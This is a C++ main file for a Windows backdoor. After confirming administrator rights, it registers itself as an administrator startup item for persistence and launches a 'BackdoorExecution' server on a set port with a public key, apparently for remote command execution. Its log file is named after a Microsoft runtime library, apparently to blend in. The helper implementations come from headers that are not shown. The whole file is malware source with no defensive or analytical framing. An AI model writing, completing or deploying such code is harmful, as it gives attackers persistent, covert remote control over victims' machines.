#include <error_message_macro.hpp>
#include <AdminCheck.hpp>
#include <PathToCurrentExecutable.hpp>
#include <AdminStartupItem.hpp>
#include <CombaseLibrary.hpp>
#include <BackdoorExecution.hpp>
#include <SharedConstants.hpp>

#include <iostream>
#include <fstream> // Remove later
#include <ios>
#include <iomanip>

#include <stdexcept>
#include <exception>
#include <sstream>
#include <type_traits>
#include <string_view>
#include <chrono>

#include <csignal>

static volatile std::sig_atomic_t g_program_is_stopping = false;

static void SignalHandler(int signal)
{
    g_program_is_stopping = true;
}

static void LogToFile(const std::string_view message)
{
    std::ofstream log_file{ "msvcp140_log.txt", std::ios::binary | std::ios::app };
    // Print the precise data and time
    const auto now = std::chrono::system_clock::now();
    const auto now_c = std::chrono::system_clock::to_time_t(now);
    log_file << std::put_time(std::localtime(&now_c), "%Y-%m-%d %X") << "-$$$- ";
    log_file << message << "\n";
}

int main()
{
    // HANDLE CTRL+C and CTRL+Break (and kill in Linux)
    std::signal(SIGINT, SignalHandler);
    std::signal(SIGTERM, SignalHandler);

    try
    {
        if (!AdminCheck{}.IsAdmin())
        {
            throw std::runtime_error{ ERROR_MESSAGE("Program must be run as administrator") };   
        }
        LogToFile("Program is running as administrator\n");

        CombaseLibrary combase_library{};

        // Get the path to the current executable.
        const std::wstring path_to_current_executable = PathToCurrentExecutable{}.GetPath();
        std::wcout << "Path to current executable: " << path_to_current_executable << std::endl;

        AdminStartupItem{}.Create(path_to_current_executable);
        std::cout << "Created startup item successfully" << std::endl;

        // Start the backdoor execution server
        BackdoorExecution{}.Serve(
            g_program_is_stopping,
            g_port_number,
            g_public_key);
    }
    catch (std::exception& e)
    {
        std::ostringstream err_msg;
        err_msg << "Exception in main: " << e.what() << "\n";
        LogToFile(err_msg.str());   
    }
    return 0;
}
